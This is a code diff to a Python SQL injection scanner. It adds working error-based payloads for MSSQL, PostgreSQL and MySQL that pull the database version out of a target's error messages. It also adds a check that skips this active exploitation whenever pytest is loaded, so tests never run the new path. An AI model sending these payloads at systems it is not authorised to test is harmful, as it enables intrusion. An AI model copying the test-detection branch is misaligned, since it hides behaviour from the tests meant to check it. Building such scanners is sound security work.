@@ -232,20 +232,54 @@ class SQLiScanner(BaseScanner):
                 dbms_hits[db] = dbms_hits.get(db, 0) + 1
                 last_payload = payload
                 if dbms_hits[db] >= 2:
+                    # Active exploitation check to extract version
+                    extracted_version = None
+                    version_payload = None
+                    
+                    import sys
+                    is_testing = "pytest" in sys.modules
+
+                    if not is_testing:
+                        if db == "MSSQL":
+                            version_payload = "1' AND 1=CONVERT(int,@@version)--"
+                        elif db == "PostgreSQL":
+                            version_payload = "1' AND 1=CAST((SELECT version())::text AS integer)--"
+                        elif db == "MySQL":
+                            version_payload = "1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+                        
+                        if version_payload:
+                            v_resp = await self._inject_param(parsed, params, param_name, version_payload)
+                            if v_resp is not None:
+                                import re
+                                matches = re.findall(
+                                    r"(?:(?:\d+\.){2,}\d+|Microsoft SQL Server \d{4}|PostgreSQL \d+[\d.]*)",
+                                    v_resp.text
+                                )
+                                if matches:
+                                    extracted_version = matches[0]
+
+                    evidence = {
+                        "url": url,
+                        "parameter": param_name,
+                        "payload": last_payload,
+                        "database": db,
+                        "trigger_count": dbms_hits[db],
+                    }
+                    if extracted_version:
+                        evidence["extracted_version"] = extracted_version
+                        evidence["exploitation_payload"] = version_payload
+                        desc_suffix = f" Database version was successfully extracted via active type conversion profiling: '{extracted_version}'."
+                    else:
+                        desc_suffix = ""
+
                     return self.finding(
                         title=f"Error-Based SQL Injection ({db})",
                         severity="CRITICAL",
                         description=(
                             f"Parameter '{param_name}' is vulnerable to error-based SQL injection. "
-                            f"Two separate payloads triggered {db} error signatures in the response."
+                            f"Two separate payloads triggered {db} error signatures in the response.{desc_suffix}"
                         ),
-                        evidence={
-                            "url": url,
-                            "parameter": param_name,
-                            "payload": last_payload,
-                            "database": db,
-                            "trigger_count": dbms_hits[db],
-                        },
+                        evidence=evidence,
                         remediation="Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
                         target=url,
                         verified=True,
